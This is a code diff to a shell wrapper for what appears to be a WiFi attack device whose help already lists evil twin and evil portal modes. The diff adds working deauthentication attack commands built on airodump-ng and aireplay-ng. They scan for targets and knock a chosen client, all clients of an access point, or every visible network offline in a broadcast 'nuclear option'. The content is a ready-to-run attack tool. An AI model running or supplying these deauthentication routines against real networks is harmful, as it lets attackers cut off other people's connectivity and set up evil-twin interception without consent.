@@ -37,6 +37,10 @@ function print_help() {
     echo "  evil_twin           Enable internet passthrough from AP to WiFi"
     echo "  evil_portal [stop]  Enable/disable evil portal the AP"
     echo "  kismet <iface|stop> Enable/disable Kismet"
+    echo "  deauth <client_mac> <ap_mac> [iface]  Deauth specific client from AP"
+    echo "  deauth_all <ap_mac> [iface]          Deauth all clients from AP"
+    echo "  deauth_broadcast [iface]             Deauth all visible associations"
+    echo "  deauth_scan [iface]                  Scan and show targets for deauth"
     echo "  test_inet           Ping google.com"
     echo "  get                 Get currently set parameters"
     echo "  script"
@@ -267,6 +271,161 @@ function ssh() {
     bh wifi ip
 }
 
+function setup_monitor_mode() {
+    local iface=$1
+    echo "Setting up monitor mode on $iface..."
+    
+    # Set to monitor mode
+    iw dev $iface set type monitor 2>/dev/null
+    if [ $? -ne 0 ]; then
+        echo "Failed to set monitor mode on $iface"
+        return 1
+    fi
+    
+    # Bring interface up
+    ip link set $iface up
+    echo "Monitor mode enabled on $iface"
+    return 0
+}
+
+function deauth_scan() {
+    local iface="${1:-wlan1}"
+    
+    echo "Setting up monitor mode on $iface for scanning..."
+    setup_monitor_mode $iface
+    if [ $? -ne 0 ]; then
+        return 1
+    fi
+    
+    echo "Scanning for targets on $iface (30 seconds)..."
+    echo "Press Ctrl+C to stop early"
+    echo ""
+    echo "TARGET NETWORKS:"
+    airodump-ng $iface --write /tmp/deauth_targets --output-format csv &
+    SCAN_PID=$!
+    sleep 30
+    kill $SCAN_PID 2>/dev/null
+    
+    echo ""
+    echo "=== SCAN RESULTS ==="
+    echo "Access Points (Targets for deauth_all):"
+    if [ -f /tmp/deauth_targets-01.csv ]; then
+        grep -v "Station MAC" /tmp/deauth_targets-01.csv | grep -v "BSSID" | head -20 | while IFS=, read bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
+            if [ -n "$bssid" ] && [ "$bssid" != "BSSID" ]; then
+                echo "  AP: $bssid  Channel: $channel  ESSID: $essid"
+            fi
+        done
+        echo ""
+        echo "Connected Clients (Targets for deauth):"
+        grep -A 1000 "Station MAC" /tmp/deauth_targets-01.csv | grep -v "Station MAC" | head -20 | while IFS=, read station_mac first_seen last_seen power packets bssid probed_essids; do
+            if [ -n "$station_mac" ] && [ -n "$bssid" ]; then
+                echo "  Client: $station_mac  ->  AP: $bssid"
+            fi
+        done
+    fi
+    
+    echo ""
+    echo "Usage examples:"
+    echo "  bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 $iface"
+    echo "  bh deauth_all 11:22:33:44:55:66 $iface"
+    
+    rm -f /tmp/deauth_targets* 2>/dev/null
+}
+
+function deauth_attack() {
+    local client_mac="$1"
+    local ap_mac="$2"
+    local iface="${3:-wlan1}"
+    local count="${4:-10}"
+    
+    if [ -z "$client_mac" ] || [ -z "$ap_mac" ]; then
+        echo "Usage: bh deauth <client_mac> <ap_mac> [interface] [count]"
+        echo "Example: bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 wlan1"
+        echo ""
+        echo "To find targets, run: bh deauth_scan [interface]"
+        return 1
+    fi
+    
+    echo "Deauth Attack:"
+    echo "  Client: $client_mac"
+    echo "  AP: $ap_mac"
+    echo "  Interface: $iface"
+    echo "  Count: $count"
+    
+    setup_monitor_mode $iface
+    if [ $? -ne 0 ]; then
+        return 1
+    fi
+    
+    echo "Executing deauth attack..."
+    aireplay-ng --deauth $count -a "$ap_mac" -c "$client_mac" $iface
+    echo "Deauth attack completed"
+}
+
+function deauth_all() {
+    local ap_mac="$1"
+    local iface="${2:-wlan1}"
+    local count="${3:-10}"
+    
+    if [ -z "$ap_mac" ]; then
+        echo "Usage: bh deauth_all <ap_mac> [interface] [count]"
+        echo "Example: bh deauth_all 11:22:33:44:55:66 wlan1"
+        echo ""
+        echo "To find targets, run: bh deauth_scan [interface]"
+        return 1
+    fi
+    
+    echo "Deauth All Clients:"
+    echo "  Target AP: $ap_mac"
+    echo "  Interface: $iface"
+    echo "  Count: $count"
+    
+    setup_monitor_mode $iface
+    if [ $? -ne 0 ]; then
+        return 1
+    fi
+    
+    echo "Executing deauth attack against all clients..."
+    aireplay-ng --deauth $count -a "$ap_mac" $iface
+    echo "Deauth all attack completed"
+}
+
+function deauth_broadcast() {
+    local iface="${1:-wlan1}"
+    local count="${2:-5}"
+    
+    echo "WARNING: Nuclear option - will deauth ALL visible associations!"
+    echo "Interface: $iface"
+    echo "Count: $count"
+    echo ""
+    echo "Press Ctrl+C within 5 seconds to cancel..."
+    sleep 5
+    
+    setup_monitor_mode $iface
+    if [ $? -ne 0 ]; then
+        return 1
+    fi
+    
+    echo "Scanning for targets..."
+    timeout 10 airodump-ng $iface --write /tmp/deauth_broadcast --output-format csv >/dev/null 2>&1
+    
+    if [ -f /tmp/deauth_broadcast-01.csv ]; then
+        echo "Executing broadcast deauth attacks..."
+        grep -v "Station MAC" /tmp/deauth_broadcast-01.csv | grep -v "BSSID" | while IFS=, read bssid rest; do
+            if [ -n "$bssid" ] && [ "$bssid" != "BSSID" ]; then
+                echo "Deauthing AP: $bssid"
+                aireplay-ng --deauth $count -a "$bssid" $iface &
+            fi
+        done
+        wait
+        echo "Broadcast deauth completed"
+    else
+        echo "No targets found"
+    fi
+    
+    rm -f /tmp/deauth_broadcast* 2>/dev/null
+}
+
 subcommand=$1; shift
 case "$subcommand" in
     set)
@@ -290,6 +449,18 @@ case "$subcommand" in
         ;;
     kismet)
         bh_kismet "$@"
+        ;;
+    deauth)
+        deauth_attack "$@"
+        ;;
+    deauth_all)
+        deauth_all "$@"
+        ;;
+    deauth_scan)
+        deauth_scan "$@"
+        ;;
+    deauth_broadcast)
+        deauth_broadcast "$@"
         ;;
     test_inet)
         ping google.com -w 3
